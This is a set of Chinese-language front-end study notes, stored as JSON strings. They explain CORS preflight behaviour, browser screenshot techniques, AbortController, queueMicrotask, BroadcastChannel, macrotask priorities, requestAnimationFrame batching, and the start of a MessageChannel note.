前端代码\nfetch('http://api.example.com/data')\n    .then(response => response.json())\n    .catch(error => {\n        // 请求已发送，但浏览器拦截了响应\n        console.error('跨域错误');\n    });\n\n// 服务器日志会显示\n// \"收到 GET 请求 /data\"\n```\n\n#### 1.4.2. 场景二：非简单请求的预检失败\n\n```javascript\n// 前端代码\nfetch('http://api.example.com/data', {\n    method: 'DELETE',\n    headers: {\n        'Content-Type': 'application/json'\n    }\n}).catch(error => {\n    // 预检请求失败，主请求不会发送\n    console.error('预检请求失败');\n});\n\n// 服务器日志只会显示\n// \"收到 OPTIONS 请求 /data\"\n```\n\n#### 1.4.3. 场景三：预检成功但主请求失败\n\n```javascript\n// 前端代码\nfetch('http://api.example.com/data', {\n    method: 'PUT',\n    headers: {\n        'Content-Type': 'application/json'\n    }\n}).catch(error => {\n    // 预检成功，主请求发送但响应被拦截\n    console.error('主请求跨域错误');\n});\n\n// 服务器日志会显示\n// \"收到 OPTIONS 请求 /data\"\n// \"收到 PUT 请求 /data\"\n```\n\n### 1.5. 验证方法\n\n1. **网络面板检查**\n```javascript\n// 打开浏览器开发者工具\n// Network 面板中可以看到：\n// - 请求是否发送\n// - 预检请求的存在\n// - 具体的错误信息\n```\n\n2. **服务器日志**\n```javascript\n// 服务端日志记录\napp.use((req, res, next) => {\n    console.log({\n        method: req.method,\n        url: req.url,\n        headers: req.headers,\n        timestamp: new Date().toISOString()\n    });\n    next();\n});\n```\n\n3. **抓包工具验证**\n```bash\n# 使用 tcpdump 抓包\ntcpdump -i any port 80 -w capture.pcap\n\n# 使用 Charles 或 Fiddler 等工具查看请求\n```\n\n### 1.6. 解决方案\n\n1. **服务端正确配置 CORS**\n```javascript\n// Express 示例\napp.use((req, res, next) => {\n    res.header('Access-Control-Allow-Origin', '*');\n    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS');\n    res.header('Access-Control-Allow-Headers', 'Content-Type');\n    next();\n});\n```\n\n2. **使用代理服务器**\n```javascript\n// 开发环境 webpack 配置\nmodule.exports = {\n    devServer: {\n        proxy: {\n            '/api': {\n                target: 'http://api.example.com',\n                changeOrigin: true\n            }\n        }\n    }\n};\n```\n\n3. **JSONP（仅适用于 GET 请求）**\n```javascript\nfunction jsonp(url, callback) {\n    const script = document.createElement('script');\n    script.src = `${url}?callback=${callback}`;\n    document.body.appendChild(script);\n}\n```\n\n### 1.7. 总结\n\n- **简单请求**：\n\t- ==确实发送到服务器==\n\t- 服务器会处理请求\n\t- ==浏览器拦截响应==\n- **非简单请求**：\n\t- 先发送预检请求\n\t- 预检失败则**主请求**==不发送==\n\t- 预检成功则发送**主请求**\n- **服务器视角**：\n\t- 总是能收到成功发送的请求\n\t- 可以正常处理请求\n\t- 返回的响应可能被浏览器拦截\n- **关键点**：\n\t- 跨域是浏览器的安全策略\n\t- 拦截发生在响应阶段\n\t- 服务器端无法阻止请求发送\n\n\n当预检请求（OPTIONS）返回不允许跨域时，浏览器**不会**发送真正的请求。让我通过代码和图解来说明这个过程：\n\n![568](#)","01MEelUr":"\n# 浏览器实现截图\n\n`#bom` \n\n\n## 目录\n<!-- toc -->\n ## 1. HTML5 Canvas 截图 \n\n这是最基本和常用的方法，主要使用 `Canvas API` 来实现。\n\n```javascript hl:21,11\n// 基本实现步骤\nfunction captureElement(element) {\n    // 1. 创建 canvas\n    const canvas = document.createElement('canvas');\n    const context = canvas.getContext('2d');\n    \n    // 2. 设置 canvas 尺寸\n    canvas.width = element.offsetWidth;\n    canvas.height = element.offsetHeight;\n    \n    // 3. 将目标元素绘制到 canvas\n    const html2canvas = new html2canvas(element);\n    \n    // 4. 转换为图片\n    const image = canvas.toDataURL('image/png');\n    \n    // 5. 下载或使用图片\n    const link = document.createElement('a');\n    link.download = 'screenshot.png';\n    link.href = image;\n    link.click();\n}\n```\n\n## 2. MediaDevices API (屏幕录制)\n\n用于捕获屏幕内容，可以实现更复杂的屏幕截图功能。\n\n```javascript\nasync function captureScreen() {\n    try {\n        // 1. 请求屏幕捕获权限\n        const stream = await navigator.mediaDevices.getDisplayMedia({\n            video: {\n                mediaSource: 'screen'\n            }\n        });\n        \n        // 2. 创建 video 元素\n        const video = document.createElement('video');\n        video.srcObject = stream;\n        \n        // 3. 等待视频加载\n        await new Promise(resolve => video.onloadedmetadata = resolve);\n        video.play();\n        \n        // 4. 创建 canvas 并截图\n        const canvas = document.createElement('canvas');\n        canvas.width = video.videoWidth;\n        canvas.height = video.videoHeight;\n        \n        const ctx = canvas.getContext('2d');\n        ctx.drawImage(video, 0, 0);\n        \n        // 5. 停止所有轨道\n        stream.getTracks().forEach(track => track.stop());\n        \n        // 6. 转换为图片\n        return canvas.toDataURL('image/png');\n    } catch (err) {\n        console.error('Error: ' + err);\n    }\n}\n```\n\n## 3. 使用第三方库 `html2canvas`\n\n`html2canvas` 是一个流行的库，可以将 DOM 元素转换为 canvas。\n\n```javascript\nimport html2canvas from 'html2canvas';\n\nfunction captureElementWithHtml2canvas(element) {\n    html2canvas(element, {\n        // 配置选项\n        useCORS: true,            // 处理跨域图片\n        scale: window.devicePixelRatio, // 设备像素比\n        logging: true,            // 启用日志\n        allowTaint: true,         // 允许加载跨域图片\n        backgroundColor: null     // 背景色\n    }).then(canvas => {\n        // 转换为图片\n        const image = canvas.toDataURL('image/png');\n        // 处理图片...\n    });\n}\n```\n\n## 4. 浏览器扩展 API\n\n如果是**开发浏览器扩展**，可以使用**浏览器提供的截图 API**：\n\n```javascript\n// Chrome 扩展示例\nchrome.tabs.captureVisibleTab(null, {}, function(image) {\n    // image 是 base64 编码的图片数据\n});\n```\n\n## 5. 实现中需要注意的问题\n\n### 5.1. 跨域资源处理\n\n```javascript hl:3\n// 处理跨域图片\nconst img = new Image();\nimg.crossOrigin = 'anonymous';\nimg.src = url;\n```\n\n### 5.2. 高分辨率屏幕支持\n\n```javascript\n// 考虑设备像素比\ncanvas.width = element.offsetWidth * window.devicePixelRatio;\ncanvas.height = element.offsetHeight * window.devicePixelRatio;\ncontext.scale(window.devicePixelRatio, window.devicePixelRatio);\n```\n\n### 5.3. 异步内容处理\n\n```javascript\n// 等待图片加载完成\nasync function waitForImages(element) {\n    const images = element.getElementsByTagName('img');\n    const promises = Array.from(images).map(img => {\n        if (img.complete) return Promise.resolve();\n        return new Promise(resolve => {\n            img.onload = resolve;\n            img.onerror = resolve;\n        });\n    });\n    await Promise.all(promises);\n}\n```\n\n### 5.4. 性能优化\n\n```javascript\n// 使用 requestAnimationFrame 优化性能\nrequestAnimationFrame(() => {\n    // 执行截图操作\n});\n```\n\n## 6. 常见应用场景\n\n1. 网页内容分享\n2. 生成缩略图\n3. 页面 bug 截图反馈\n4. 生成图片报告\n5. 保存 canvas 绘制内容\n\n## 7. 总结\n\n前端实现截图功能主要依赖：\n- `Canvas API` 进行图像处理\n- `MediaDevices API` 捕获屏幕内容\n- 第三方库提供的功能 → `html2canvas`\n- 浏览器扩展 API\n\t- 利用浏览器本身提供的能力\n\t\t- 类似的还有很多能力，比如截图，离线渲染、生成 PDF 等等\n\n","FfFdzQrb":"\n# AbortController\n\n`#bom` `#浏览器` \n\n\n## 目录\n<!-- toc -->\n ## 1. 简介 \n\n>  用于终止或取消一个请求、或者删除关联的事件监听器\n\n`AbortController` 接口表示一个控制器对象，允许你根据需`要中止一个或多个 Web 请求`。\n\n![图片&文件](./files/20241024-19.png)\n\n## 2. 使用 \n\n```javascript hl:9\n// `AbortController` 是 JavaScript 中的一个全局类，\nconst controller = new AbortController();  \n\n// 可以将它传递给要中断的 API，来响应中断事件并进行相应处理，例如，传递给 `fetch()` 方法就可以终止这个请求了\ncontroller.signal;  \n// 调用这个方法会触发 `signal` 上的中止事件，并将信号标记为已中止\ncontroller.abort();\n\n// 监听 abort 事件\ncontroller.signal.addEventListener('abort', () => {  \n  // 实现中止逻辑  \n});\n```\n\n## 3. 不仅可以使用请求，还可以用于各类事件 → **删除关联的事件监听器**\n\n```javascript hl:14\nuseEffect(() => {  \n  const controller = new AbortController();  \n  \n  window.addEventListener('resize', handleResize, {  \n    signal: controller.signal,  \n  });  \n  window.addEventListener('hashchange', handleHashChange, {  \n    signal: controller.signal,  \n  });  \n  window.addEventListener('storage', handleStorageChange, {  \n    signal: controller.signal,  \n  });  \n\n // 在清理函数中，我只需调用一次 `controller.abort()` 就可以删除所有添加的监听器\n  return () => {  \n    // 调用 `.abort()` 会删除所有关联的事件监听器  \n    controller.abort();  \n  };  \n}, []);\n```\n\n## 4. Node.js 中由 `http` 模块发出的请求也支持 `signal` 属性\n\n## 5. 一个示例：终止错误原因\n\n```javascript\nasync function fetchData() {\n  const controller = new AbortController();\n  const signal = controller.signal; // 监听 abort 事件，并打印中止原因\n\n  signal.addEventListener(\"abort\", () => {\n    console.log(\"请求中止原因:\", signal.reason); // 打印自定义的中止原因\n  });\n\n  try {\n    const response = await fetch(\n      \"https://jsonplaceholder.typicode.com/posts/1\",\n      { signal },\n    );\n    const data = await response.json();\n    console.log(\"请求成功:\", data);\n  } catch (error) {\n    if (error.name === \"AbortError\") {\n      console.error(\"请求因中止被取消:\", error.message);\n    } else {\n      console.error(\"请求出错:\", error.message);\n    }\n  } // 保存 controller 以便取消操作\n  window.currentAbortController = controller;\n}\n\nfetchData(); // 监听取消按钮的点击事件\n\ndocument.getElementById(\"cancelButton\").addEventListener(\"click\", () => {\n  if (window.currentAbortController) {\n    window.currentAbortController.abort(\"用户取消了请求\"); // 提供自定义的中止原因\n    console.log(\"点击了取消请求按钮\");\n  } else {\n    console.log(\"没有正在进行的请求\");\n  }\n});\n\n```\n","OgDrLp8B":"\n# queueMicrotask\n\n`#bom` `#异步` \n\n\n## 目录\n<!-- toc -->\n ## 1. 基本概念 \n\n```javascript\n// 最简单的使用方式\nqueueMicrotask(() => {\n    console.log('这是一个微任务');\n});\n```\n\n- `queueMicrotask` 是一个用于将回调函数作为**微任务（microtask）** 添加到微任务队列中的全局函数\n- **nodejs 环境和浏览器环境都可用**\n- `queueMicrotask` 可用于批量处理状态更新\n\t- **确保 DOM 只更新一次**，而不是每次状态变化都更新，如下代码\n\n```javascript hl:9,22,23,24\nlet state = { count: 0 };\nlet updateScheduled = false;\n\nfunction updateState(newState) {\n  Object.assign(state, newState);\n\n  if (!updateScheduled) {\n    updateScheduled = true;\n    queueMicrotask(() => {\n      updateDOM();\n      updateScheduled = false;\n    });\n  }\n}\n\nfunction updateDOM() {\n  console.log(\"Updating DOM with state:\", state);\n  // 实际的 DOM 更新操作\n}\n\n// 使用示例\nupdateState({ count: 1 });\nupdateState({ count: 2 });\nupdateState({ count: 3 });\n\nconsole.log(\"Current state:\", state);\n```\n\n## 2. 与 Promise 的关系\n\n**看哪个在前面，哪个在前面就先执行**\n\n```javascript\n// 这两种方式效果相同\nqueueMicrotask(() => {\n    console.log('方式1');\n});\n\nPromise.resolve().then(() => {\n    console.log('方式2');\n});\n```\n\n## 3. 执行顺序\n\n```javascript\nconsole.log('1'); // 同步任务\n\nsetTimeout(() => {\n    console.log('4'); // 宏任务\n}, 0);\n\nqueueMicrotask(() => {\n    console.log('2'); // 微任务\n});\n\nconsole.log('3'); \n\n// 输出顺序: 1, 3, 2, 4\n```\n\n## 4. 常见使用场景及注意事项\n\n### 4.1. 状态同步\n\n```javascript\nclass State {\n    constructor() {\n        this.value = 0;\n        this.callbacks = [];\n    }\n\n    setValue(newValue) {\n        this.value = newValue;\n        // 确保回调在当前同步代码执行完后才执行\n        queueMicrotask(() => {\n            this.callbacks.forEach(cb => cb(this.value));\n        });\n    }\n\n    onChange(callback) {\n        this.callbacks.push(callback);\n    }\n}\n```\n\n### 4.2. 防止递归嵌套堆栈溢出\n\n```javascript\nfunction processArray(array) {\n    const results = [];\n    \n    function process(index) {\n        if (index >= array.length) return;\n        \n        results.push(array[index]);\n        \n        // 避免深层递归\n        queueMicrotask(() => process(index + 1));\n    }\n    \n    process(0);\n}\n```\n\n### 4.3. 错误处理：一定要==顶层使用==\n\n```javascript hl:11\n// 错误的方式\ntry {\n    queueMicrotask(() => {\n        throw new Error('错误');\n    });\n} catch(e) {\n    // 永远不会捕获到错误\n    console.error(e);\n}\n\n// 正确的方式\nqueueMicrotask(() => {\n    try {\n        throw new Error('错误');\n    } catch(e) {\n        console.error(e);\n    }\n});\n```\n\n### 4.4. 批量处理\n\n```javascript\nclass BatchProcessor {\n    constructor() {\n        this.queue = [];\n        this.scheduled = false;\n    }\n\n    add(item) {\n        this.queue.push(item);\n        if (!this.scheduled) {\n            this.scheduled = true;\n            queueMicrotask(() => {\n                this.processQueue();\n                this.scheduled = false;\n            });\n        }\n    }\n\n    processQueue() {\n        const items = [...this.queue];\n        this.queue = [];\n        // 处理队列项\n        items.forEach(item => console.log('处理:', item));\n    }\n}\n```\n\n### 4.5. 尽量顶层使用\n\n```javascript hl:1,6\n// 不好的做法\nfor (let i = 0; i < 1000; i++) {\n    queueMicrotask(() => console.log(i));\n}\n\n// 更好的做法\nconst items = Array.from({length: 1000}, (_, i) => i);\nqueueMicrotask(() => {\n    items.forEach(i => console.log(i));\n});\n```\n\n## 5. 与其他异步机制的比较\n\n```javascript\n// 1. queueMicrotask\nqueueMicrotask(() => console.log('微任务'));\n\n// 2. Promise\nPromise.resolve().then(() => console.log('Promise微任务'));\n\n// 3. setTimeout\nsetTimeout(() => console.log('宏任务'), 0);\n\n// 4. requestAnimationFrame\nrequestAnimationFrame(() => console.log('动画帧'));\n\n// 执行顺序：微任务 ≈ Promise微任务 > 宏任务 > 动画帧\n```\n\n## 6. 总结\n\n- `queueMicrotask` 是处理微任务的标准方式\n- 比 `Promise` 更直接和轻量\n- 适用于需要异步但又要保持高优先级的场景\n- 需要注意错误处理和性能影响","nrVrtgIK":"\n# BroadcastChannel\n\n\n## 目录\n<!-- toc -->\n ## 1. 简介 \n\n- BroadcastChannel 是一个用于==同源页面==之间进行通信的 Web API。\n- 它允许同源的不同浏览器窗口、标签页、iframe 之间发送和接收消息。\n\n## 2. 基本使用\n\n```javascript\n// 创建或连接到一个广播频道\nconst channel = new BroadcastChannel('channel-name');\n\n// 发送消息\nchannel.postMessage('Hello from page A!');\n\n// 接收消息\nchannel.onmessage = (event) => {\n    console.log('Received:', event.data);\n};\n\n// 关闭连接\nchannel.close();\n```\n\n## BroadcastChannel 的 name 参数说明\n\n> [!danger]\n> 只要使用相同的 channel name，就会连接到同一个广播频道\n\n\nBroadcastChannel 不需要在不同 Tab 之间`共享变量`。\n- 每个 Tab 只需要使用相同的 channel name 创建自己的 BroadcastChannel 实例即可。\n\n\n```javascript\n// 在任意 Tab 中，只要使用相同的 channel name ('my-channel')，\n// 就可以创建一个连接到同一广播频道的实例\nconst channel = new BroadcastChannel('my-channel');\n```\n\n### 演示\n\n假设我们有三个 HTML 文件，分别在不同的 Tab 中打开：\n\n#### page1.html\n\n```html hl:10\n<!-- page1.html -->\n<!DOCTYPE html>\n<html>\n<body>\n    <h1>Page 1</h1>\n    <button onclick=\"sendMessage()\">Send Message from Page 1</button>\n    <div id=\"messages\"></div>\n\n    <script>\n        // 每个页面创建自己的 channel 实例\n        const channel = new BroadcastChannel('my-channel');\n\n        function sendMessage() {\n            channel.postMessage({\n                from: 'Page 1',\n                content: 'Hello from Page 1!',\n                time: new Date().toLocaleTimeString()\n            });\n        }\n\n        // 监听消息\n        channel.onmessage = (event) => {\n            const messagesDiv = document.getElementById('messages');\n            messagesDiv.innerHTML += `\n                <p>Received: ${event.data.content} (from ${event.data.from} at ${event.data.time})</p>\n            `;\n        }\n    </script>\n</body>\n</html>\n```\n\n#### page2.html\n\n```html hl:11,10\n<!-- page2.html -->\n<!DOCTYPE html>\n<html>\n<body>\n    <h1>Page 2</h1>\n    <button onclick=\"sendMessage()\">Send Message from Page 2</button>\n    <div id=\"messages\"></div>\n\n    <script>\n        // 在另一个页面创建一个新的 channel 实例，使用相同的名称\n        const channel = new BroadcastChannel('my-channel');\n\n        function sendMessage() {\n            channel.postMessage({\n                from: 'Page 2',\n                content: 'Hello from Page 2!',\n                time: new Date().toLocaleTimeString()\n            });\n        }\n\n        channel.onmessage = (event) => {\n            const messagesDiv = document.getElementById('messages');\n            messagesDiv.innerHTML += `\n                <p>Received: ${event.data.content} (from ${event.data.from} at ${event.data.time})</p>\n            `;\n        }\n    </script>\n</body>\n</html>\n```\n\n#### page3.html\n\n```html hl:10\n<!-- page3.html -->\n<!DOCTYPE html>\n<html>\n<body>\n    <h1>Page 3</h1>\n    <button onclick=\"sendMessage()\">Send Message from Page 3</button>\n    <div id=\"messages\"></div>\n\n    <script>\n        // 在第三个页面同样创建一个 channel 实例\n        const channel = new BroadcastChannel('my-channel');\n\n        function sendMessage() {\n            channel.postMessage({\n                from: 'Page 3',\n                content: 'Hello from Page 3!',\n                time: new Date().toLocaleTimeString()\n            });\n        }\n\n        channel.onmessage = (event) => {\n            const messagesDiv = document.getElementById('messages');\n            messagesDiv.innerHTML += `\n                <p>Received: ${event.data.content} (from ${event.data.from} at ${event.data.time})</p>\n            `;\n        }\n    </script>\n</body>\n</html>\n```\n\n### 关键点说明\n\n1. **独立实例**\n   - 每个 Tab 都创建自己的 BroadcastChannel 实例\n   - 实例之间是相互独立的\n   - 不需要共享变量\n\n2. **连接机制**\n   ```javascript\n   // 只要使用相同的 channel name，就会连接到同一个广播频道\n   const channel = new BroadcastChannel('my-channel');\n   ```\n\n3. **自动连接**\n   - ==浏览器会自动处理==不同 Tab 之间的连接\n   - 不需要手动建立连接\n   - 不需要共享任何变量\n\n4. **生命周期**\n   ```javascript\n   // 页面关闭时自动断开连接\n   // 也可以手动关闭\n   window.addEventListener('unload', () => {\n       channel.close();\n   });\n   ```\n\n5. **实际应用示例**\n   ```javascript\n   // 可以封装成一个通用的消息系统\n   class TabCommunication {\n       constructor(channelName = 'app-channel') {\n           this.channel = new BroadcastChannel(channelName);\n           this.handlers = new Map();\n           \n           this.channel.onmessage = (event) => {\n               const { type, data } = event.data;\n               if (this.handlers.has(type)) {\n                   this.handlers.get(type)(data);\n               }\n           };\n       }\n\n       send(type, data) {\n           this.channel.postMessage({ type, data });\n       }\n\n       on(type, handler) {\n           this.handlers.set(type, handler);\n       }\n\n       close() {\n           this.channel.close();\n           this.handlers.clear();\n       }\n   }\n\n   // 使用示例\n   const communication = new TabCommunication();\n\n   // 注册消息处理器\n   communication.on('userLogin', (userData) => {\n       console.log('User logged in:', userData);\n   });\n\n   // 发送消息\n   communication.send('userLogin', { id: 1, name: 'John' });\n   ```\n\n>  BroadcastChannel API 的设计就是基于 channel name 来建立通信的。\n>  只要在不同的 Tab 中使用相同的 channel name 创建实例，它们就能相互通信。\n>  这是浏览器内部实现的机制，对开发者来说是透明的。\n\n## 3. 完整示例：使用相同的 name → test-channel\n\n### 页面 A \n\n```javascript\n// 页面 A\nconst channelA = new BroadcastChannel('test-channel');\n\n// 发送消息\nchannelA.postMessage({\n    type: 'greeting',\n    content: 'Hello from Page A',\n    timestamp: Date.now()\n});\n\n// 监听消息\nchannelA.onmessage = (event) => {\n    console.log('Page A received:', event.data);\n};\n\n// 错误处理\nchannelA.onmessageerror = (event) => {\n    console.error('Error receiving message:', event);\n};\n\n// 当不再需要时关闭\n// channelA.close();\n```\n\n### 页面 B \n\n```javascript\n// 页面 B\nconst channelB = new BroadcastChannel('test-channel');\n\n// 发送消息\nchannelB.postMessage({\n    type: 'response',\n    content: 'Hello back from Page B',\n    timestamp: Date.now()\n});\n\n// 监听消息\nchannelB.onmessage = (event) => {\n    console.log('Page B received:', event.data);\n};\n```\n\n## 4. 主要特点\n\n### 1. **同源策略**\n\n   - 只能在同源（相同的协议、域名和端口）的页面间通信\n   ```javascript\n   // 只有相同源的页面才能接收到消息\n   // https://example.com 和 https://example.com/page2.html 可以通信\n   // https://example.com 和 https://other-domain.com 不能通信\n   ```\n\n### 2. **广播性质**\n\n   - 消息会广播给所有订阅了该频道的页面\n   ```javascript\n   // 所有订阅了 'news-channel' 的页面都会收到消息\n   const newsChannel = new BroadcastChannel('news-channel');\n   newsChannel.postMessage('Breaking news!');\n   ```\n\n### 3. **支持多种数据类型**\n\n   ```javascript hl:7\n   // 可以发送各种类型的数据\n   channel.postMessage({\n       text: 'Hello',\n       number: 123,\n       array: [1, 2, 3],\n       date: new Date(),\n       // 注意：不能发送函数或DOM节点\n   });\n   ```\n\n## 5. 实际应用场景\n\n### 1. **多标签页数据同步**\n\n```javascript\n// 用户登录状态同步\nconst authChannel = new BroadcastChannel('auth');\n\n// 登录成功后广播\nfunction onLogin(userData) {\n    authChannel.postMessage({\n        type: 'login',\n        user: userData\n    });\n}\n\n// 其他标签页监听登录状态\nauthChannel.onmessage = (event) => {\n    if (event.data.type === 'login') {\n        updateUIWithUserData(event.data.user);\n    }\n};\n```\n\n### 2. **主题切换同步**\n\n```javascript\nconst themeChannel = new BroadcastChannel('theme');\n\n// 切换主题时广播\nfunction toggleTheme(theme) {\n    document.body.className = theme;\n    themeChannel.postMessage({ theme });\n}\n\n// 其他页面同步主题\nthemeChannel.onmessage = (event) => {\n    document.body.className = event.data.theme;\n};\n```\n\n### 3. **购物车数据同步**\n\n```javascript\nconst cartChannel = new BroadcastChannel('shopping-cart');\n\n// 添加商品时广播\nfunction addToCart(product) {\n    cart.push(product);\n    cartChannel.postMessage({\n        type: 'add',\n        product\n    });\n}\n\n// 其他标签页同步购物车\ncartChannel.onmessage = (event) => {\n    if (event.data.type === 'add') {\n        updateCartUI(event.data.product);\n    }\n};\n```\n\n## 6. 注意事项\n\n### 1. **内存管理**\n\n```javascript\n// 在不需要时记得关闭连接\nwindow.addEventListener('unload', () => {\n    channel.close();\n});\n```\n\n### 2. **错误处理**\n\n```javascript\nchannel.onmessageerror = (event) => {\n    console.error('消息接收错误:', event);\n};\n```\n\n### 3. **兼容性检查**\n\n```javascript\nif ('BroadcastChannel' in window) {\n    // 支持 BroadcastChannel\n    const channel = new BroadcastChannel('test');\n} else {\n    // 降级处理，可以使用 localStorage 等其他方式\n    console.log('Browser does not support BroadcastChannel');\n}\n```\n\nBroadcastChannel 是一个强大的 API，特别适合用于需要在多个同源页面间同步数据的场景。它的使用简单直接，但要注意同源限制和适当的资源管理。","OFHUIf37":"\n# 浏览器的宏任务（MacroTask）的优先级\n\n`#bom` `#浏览器` \n\n\n## 目录\n<!-- toc -->\n ## 1. 宏任务优先级从高到低排序 \n\n```javascript\n// 优先级从高到低\n1. 用户交互事件（User Interaction）\n   - 点击（click）\n   - 输入（input）\n   - 键盘事件（keyboard）\n   - 触摸事件（touch）\n\n2. 网络请求回调（Network）\n   - fetch 回调\n   - XMLHttpRequest 回调\n\n3. 页面渲染事件（Rendering）\n   - requestAnimationFrame\n   - IntersectionObserver\n\n4. setTimeout/setInterval\n   - setTimeout(fn, 0) 实际最小延迟 4ms\n   - setInterval 的回调\n\n5. setImmediate（Node.js 环境）\n\n6. MessageChannel\n\n7. I/O 事件\n   - 文件操作\n   - IndexedDB\n```\n\n## 2. 具体示例\n\n```javascript\n// 1. 用户点击事件优先级最高\nbutton.addEventListener('click', () => {\n    console.log('Click event');\n});\n\n// 2. 网络请求\nfetch('/api/data').then(() => {\n    console.log('Fetch callback');\n});\n\n// 3. 渲染\nrequestAnimationFrame(() => {\n    console.log('Animation frame');\n});\n\n// 4. 定时器（较低优先级）\nsetTimeout(() => {\n    console.log('Timeout');\n}, 0);\n```\n\n## 3. 优先级影响因素\n\n### 3.1. **任务类型**：\n\n```javascript\n// 用户交互类型的任务优先级最高\nelement.addEventListener('click', () => {\n    // 高优先级\n    console.log('User interaction');\n});\n\nsetTimeout(() => {\n    // 低优先级\n    console.log('Timer');\n}, 0);\n```\n\n### 3.2. **浏览器调度策略**：\n\n```javascript\n// 示例：页面性能优化\n// 高优先级任务\ndocument.addEventListener('click', () => {\n    // 用户交互立即响应\n    updateUI();\n});\n\n// 低优先级任务\nsetTimeout(() => {\n    // 非关键操作延后执行\n    analytics.send();\n}, 0);\n```\n\n## 4. 实际应用场景\n\n### 4.1. **性能优化**：\n\n```javascript\n// 高优先级任务：关键渲染\nrequestAnimationFrame(() => {\n    updateCriticalUI();\n});\n\n// 低优先级任务：数据统计\nsetTimeout(() => {\n    sendAnalytics();\n}, 0);\n```\n\n### 4.2. **用户体验优化**：\n\n```javascript\n// 即时响应用户输入\ninput.addEventListener('input', (e) => {\n    // 立即更新UI反馈\n    updateSearchResults(e.target.value);\n});\n\n// 延迟处理非关键任务\nsetTimeout(() => {\n    // 缓存搜索结果\n    cacheResults();\n}, 100);\n```\n\n### 4.3. **资源加载优化**：\n\n```javascript\n// 优先加载关键资源\nfetch('/critical-data.json')\n    .then(handleCriticalData);\n\n// 延迟加载非关键资源\nsetTimeout(() => {\n    fetch('/non-critical-data.json')\n        .then(handleNonCriticalData);\n}, 1000);\n```\n\n## 5. 注意事项\n\n### 5.1. **定时器延迟**\n\n```javascript\n// 最小延迟 4ms\nsetTimeout(() => {\n    console.log('Delayed');\n}, 0);  // 实际至少 4ms 后执行\n```\n\n### 5.2. **优先级保证**\n\n```javascript\n// 高优先级任务不应被低优先级任务阻塞\nbutton.addEventListener('click', () => {\n    // 重要的用户响应\n    updateUI();\n    \n    // 非关键任务延后处理\n    setTimeout(nonCriticalTask, 0);\n});\n```\n\n### 5.3. **避免优先级反转**\n\n```javascript\n// 不好的做法\nsetTimeout(() => {\n    // 关键任务不应放在低优先级队列\n    criticalTask();\n}, 0);\n\n// 好的做法\nrequestAnimationFrame(() => {\n    criticalTask();\n});\n```\n\n## 6. 最佳实践\n\n### 6.1. **任务分类**\n\n```javascript\n// 关键任务：用户交互、UI更新\nfunction criticalTask() {\n    // 直接执行\n}\n\n// 非关键任务：日志、统计\nfunction nonCriticalTask() {\n    setTimeout(() => {\n        // 延迟执行\n    }, 0);\n}\n```\n\n### 6.2. **优先级管理**：\n\n```javascript\nclass TaskScheduler {\n    static high(task) {\n        requestAnimationFrame(task);\n    }\n    \n    static low(task) {\n        setTimeout(task, 0);\n    }\n}\n```\n\n","vCdo8uDh":"\n# 使用 requestAnimationFrame 批量处理操作的原理\n\n`#bom` \n\n\n## 目录\n<!-- toc -->\n ## 1. requestAnimationFrame 的基本原理 \n\n- requestAnimationFrame 是浏览器提供的一个用于优化动画渲染的 API，它的==核心原理==是：\n\t- ==同步屏幕刷新率==\n\t\t- rAF 会在浏览器**下一次重绘之前**执行回调函数\n\t\t- 通常与显示器的==刷新率==同步（一般是 60Hz，即每秒 60 次）\n\t\t- 在视觉上能提供更流畅的动画效果\n- ==批量处理机制==\n   - **多个 rAF 回调会在同一个渲染帧中执行**\n      - 他会做合并操作\n      - 可以避免在一帧内多次触发重排重绘\n      - 自动节流，防止过度渲染\n\n## 2. 批量处理的实现示例\n\n```javascript hl:23\n// 存储待处理的任务\nconst updates = new Set();\n\n// 标记是否已经请求执行批处理\nlet isPending = false;\n\n// 批量处理函数\nfunction batchProcess() {\n    // 执行所有更新任务\n    updates.forEach(update => update());\n    // 清空任务队列\n    updates.clear();\n    // 重置请求标记\n    isPending = false;\n}\n\n// 添加更新任务\nfunction scheduleUpdate(update) {\n    updates.add(update);\n    \n    if (!isPending) {\n        isPending = true;\n        requestAnimationFrame(batchProcess);\n    }\n}\n\n// 使用示例\nfunction updateElement(element, value) {\n    scheduleUpdate(() => {\n        element.style.transform = `translateX(${value}px)`;\n    });\n}\n```\n\n## 3. 实际应用场景\n\n### 3.1. DOM 批量更新：使用上面👆🏻定义的 `scheduleUpdate`\n\n```javascript hl:5\n// 批量更新多个元素\nfunction batchUpdateElements() {\n    const elements = document.querySelectorAll('.animated');\n    elements.forEach((el, index) => {\n        scheduleUpdate(() => {\n            el.style.opacity = Math.random();\n            el.style.transform = `translateX(${index * 10}px)`;\n        });\n    });\n}\n```\n\n### 3.2. 数据可视化更新\n\n```javascript hl:7\nfunction updateChart(data) {\n    let isScheduled = false;\n    \n    data.forEach(item => {\n        if (!isScheduled) {\n            isScheduled = true;\n            requestAnimationFrame(() => {\n                // 批量更新图表数据\n                renderChart(data);\n                isScheduled = false;\n            });\n        }\n    });\n}\n```\n\n## 4. 优势和注意事项\n\n### 4.1. 优势\n\n- 性能优化：\n\t- 减少==重排重绘==的次数\n\t- 更好的==内存==使用\n\t- 更流畅的==动画==效果\n- 自动调节：\n\t- 在`标签页不可见时自动暂停`，所以有更好的电池寿命\n\t- 根据设备性能自动调整执行频率\n\n## 5. 注意事项\n\n### 5.1. 时序性\n\n- rAF 的执行是异步的\n- 如果操作有严格的时序要求，需要特别处理\n\n### 5.2. 兼容性处理\n\n```javascript hl:6\n// 兼容性封装\nconst raf = window.requestAnimationFrame ||\n           window.webkitRequestAnimationFrame ||\n           window.mozRequestAnimationFrame ||\n           function(callback) {\n               return window.setTimeout(callback, 1000 / 60);\n           };\n```\n\n### 5.3. 取消操作\n\n```javascript hl:3\nconst rafId = requestAnimationFrame(callback);\n// 需要时可以取消\ncancelAnimationFrame(rafId);\n```\n\n","RIOoYtCK":"\n# MessageChannel\n\n`#bom` \n\nMessageChannel 是 HTML5 中的一个 API\n- 它提供了一种在**不同的浏览器上下文（如窗口、标签页、iframe）之间**建立双向通信通道的方法。\n- 每个 MessageChannel 都有两个 **MessagePort 对象**，它们分别代表通道的**两个端点**。\n\n\n## 目录\n<!-- toc -->\n ## 1. MessageChannel 的基本结构 \n\n```javascript hl:5\n// 创建一个新的消息通道\nconst channel = new MessageChannel();\n\n// channel.port1 和 channel.port2 是两个端口\nconst port1 = channel.port1;\nconst port2 = channel.port2;\n\n\nconst { port1, port2 } = channel;\n\n// port1 和 port2 是唯一的两个端口\nconsole.log(Object.keys(channel)); // ['port1', 'port2']\n```\n\n>  **如果需要多个端口通信，可以使用多个 